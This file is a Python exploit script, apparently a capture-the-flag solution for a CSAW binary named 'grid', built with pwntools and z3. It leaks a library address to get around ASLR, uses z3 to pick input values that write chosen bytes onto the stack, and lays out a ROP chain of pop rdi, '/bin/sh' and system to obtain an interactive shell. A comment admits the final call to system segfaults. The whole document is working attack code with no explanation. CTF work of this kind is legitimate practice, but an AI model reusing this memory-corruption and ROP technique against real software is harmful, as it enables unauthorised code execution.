from z3 import *

from pwn import *
from pwnlib import util 

from time import sleep

def add(p, shape, x, y):
    p.send(shape)
    print(p.recv())
    p.sendline("{} {}".format(x, y))
    print(p.recv())

libc = None

def display(p, capture=False):
    global libc
    p.sendline("d")
    data = p.recv()
    if capture:
      up = make_unpacker(64, endian='little', sign='unsigned')
      start = 9+19
      address = data[start:start+7]
      libstd_leak = address[0:4] + address[5:7]
      libstd_leak = up(libstd_leak+b"\x00\x00")
      libc_base = (libstd_leak - 1760) + 16384
      print("libstdc leak {:0x}".format(libstd_leak))
      print("libstdc base {:0x}".format(libc_base))
      libc = libc_base

def compute_pair(target):
    s = Solver()

    x, y = BitVecs("x y", 8)
    s.add((x << 2 + x) + (x << 2 + x) + y == target)
    s.check()
    m = s.model()

    print("x = {} y = {}".format(m[x], m[y]))
    return (m[x], m[y])

def add_address(p, address, target):
    bs = p64(address)
    for i in range(8):
        x, y = compute_pair(target+i)
        add(p, bs[i].to_bytes(1, 'little'), x, y)

p = process('grid', env={"LD_PRELOAD": "./libc-2.27.so"})
# p = remote('pwn.chal.csaw.io', 5013)

print(p.recv())

display(p, capture=True)

# 0x000000000002155f: pop rdi; ret;
poprdi = libc + 0x2155f
system = libc + 0x0004f4e0
binsh = libc + 0x001b40fa

print("adding poprdi {:0x}".format(poprdi))
print("adding binsh {:0x}".format(binsh))
print("adding system {:0x}".format(system))

add_address(p, poprdi, 0x78)
add_address(p, binsh, 0x80)

# You can control the program counter here with rdi <- /bin/sh,
# but for some reason returning to system segfaults.
add_address(p, 0x0, 0x88)

display(p, capture=False)

p.interactive()
